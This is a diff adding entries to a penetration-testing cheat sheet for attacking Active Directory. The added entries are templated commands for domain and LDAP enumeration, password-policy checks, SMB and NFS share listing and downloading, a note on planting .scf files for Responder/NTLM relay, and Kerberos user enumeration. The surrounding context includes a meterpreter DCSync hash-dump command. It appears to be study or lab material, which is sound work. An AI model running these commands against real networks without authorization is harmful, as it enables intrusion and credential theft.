@@ -5,7 +5,70 @@
 - [Bloodhound](https://github.com/BloodHoundAD/BloodHound) with [Sharphound injestor](https://github.com/BloodHoundAD/SharpHound3) or [bloodhound-python injestor](https://github.com/fox-it/BloodHound.py)
 - [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) (PowerView)
 - [RSAT](https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT_WS_1709-x64.msu)
+
 > After installing RSAT, you can go to "Users and Computers AD =&gt; View =&gt; Advanced"
+
+```bash
+enum4linux -a <target_dc> -u <USER> -p <PASSWORD> -d <domain>
+bloodhound.py -d <DOMAIN> -u <user> -p <password> -dc <FQDN-SERVER> -c all
+python ldapdomaindump.py -u '<domain>\<user>' -p '<pass>' <target>
+sudo ldapsearch -x -LLL -H ldap://webmail.<domain>.fr -D "cn=<cn>" -b "dc=<domain>,dc=<fqdn>" -w '<pass>'
+```
+
+---
+
+
+## **Domain enum**
+
+
+
+
+
+
+Get DC IP
+
+```bash
+cat /etc/resolv.conf
+nslookup <domain>
+```
+
+Password policy \(especially lockout threshold for bruteforce\)
+
+```bash
+enum4linux -P -o <target>
+enum4linux -a <target>
+```
+
+### Open shares \(anonymous SMB, NFS, FTP, etc\)
+
+SMB open shares
+
+```bash
+smbmap -H IP -r DOSSIER
+smbmap -H IP --download DOSSIER
+
+# SMB V1
+smbclient -L ///192.168.0.1 -U <user> -c ls [--option='client min protocol=NT1']
+mount //10.11.1.136/"Bob Share" /mnt/bob [-o vers=1.0]
+```
+
+SMB restricted shares
+
+```bash
+smbmap -P 445 -H <target> -u '<user>' -p '<pass>' 
+smbget -rR smb://<target>/<share>/ -U <user>
+smbclient \\\\<target>\\c$ -U <user>
+smbclient -L //<target> -U '<domain>\<user>`
+upload .ico .scf => Responder/NTLMrelayx
+```
+
+
+NFS 
+
+```bash
+showmount -e <target>
+mount <target>:/home/xx /mnt/yy 
+```
 
 ---
 
@@ -26,6 +89,13 @@ dump ntds
 
 ```bash
 meterpreter > dcsync_ntlm <DOMAIN>\<user>
+```
+
+## Kerbrute AS-REP
+
+```bash
+nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='megabank.local',userdb=/root/users.txt 10.10.10.169
+./kerbrute_linux_amd64 userenum -d <domain> usernames.txt -debug
 ```
 
 ---
